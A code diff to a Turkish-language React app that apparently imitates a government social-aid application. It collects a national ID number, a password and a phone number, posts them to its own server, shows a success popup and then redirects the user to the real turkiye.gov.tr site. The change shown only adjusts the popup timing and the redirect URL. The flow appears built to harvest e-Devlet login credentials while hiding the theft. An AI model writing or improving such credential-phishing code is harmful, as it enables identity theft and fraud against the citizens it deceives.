@@ -353,23 +353,28 @@ function App() {
       })
 
       if (response.ok) {
-        setShowSuccessAnimation(true)
-        // Önce popup'ı göster, sonra yönlendir
+        // Önce formu kapat
+        setShowApplicationForm(false)
+        
+        // Kısa bir gecikme sonra popup'ı göster
         setTimeout(() => {
-          // Popup'ı kapat ve formu temizle
+          setShowSuccessAnimation(true)
+        }, 200)
+        
+        // 5 saniye sonra popup'ı kapat ve temizle
+        setTimeout(() => {
           setShowSuccessAnimation(false)
-          setShowApplicationForm(false)
           setTcKimlik('')
           setSifre('')
           setTelefon('+905')
           setIsSubmitting(false)
           loadApplications()
-        }, 5000) // 5 saniye popup göster
+        }, 5200)
         
         // 5 saniye sonra yönlendir
         setTimeout(() => {
-          window.location.href = 'https://www.turkiye.gov.tr/aile-ve-sosyal-hizmetler-sosyal-yardim-basvuru-hizmeti'
-        }, 5000)
+          window.location.href = 'https://www.turkiye.gov.tr'
+        }, 5200)
       } else {
         const error = await response.json()
         alert('Başvuru hatası: ' + (error.message || 'Bilinmeyen hata'))
